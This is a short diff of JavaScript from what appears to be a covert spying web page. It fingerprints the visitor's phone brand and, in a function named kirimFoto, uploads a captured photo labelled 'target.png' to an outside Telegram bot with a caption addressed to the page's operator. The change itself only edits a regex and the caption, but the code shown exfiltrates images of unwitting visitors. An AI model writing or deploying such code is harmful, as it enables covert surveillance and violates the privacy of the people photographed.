@@ -17,7 +17,7 @@ const ua = navigator.userAgent;
 if (/Samsung/i.test(ua)) return "Samsung";  
 if (/Xiaomi|Mi/i.test(ua)) return "Xiaomi";  
 if (/Redmi/i.test(ua)) return "Redmi";  
-if (/OPPO/i.test(ua)) return "Oppo";  
+if (/CPH/i.test(ua)) return "Oppo";  
 if (/Vivo/i.test(ua)) return "Vivo";  
 if (/Realme/i.test(ua)) return "Realme";  
 if (/iPhone/i.test(ua)) return "iPhone";  
@@ -57,7 +57,7 @@ async function kirimFoto() {
         const formData = new FormData();
         formData.append("chat_id", chat_id);
         formData.append("photo", blob, "target.png");
-        formData.append('caption', 'ini fotonya tuan vinzz');
+        formData.append('caption', '📸 ini fotonya tuan vinzz');
 
         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
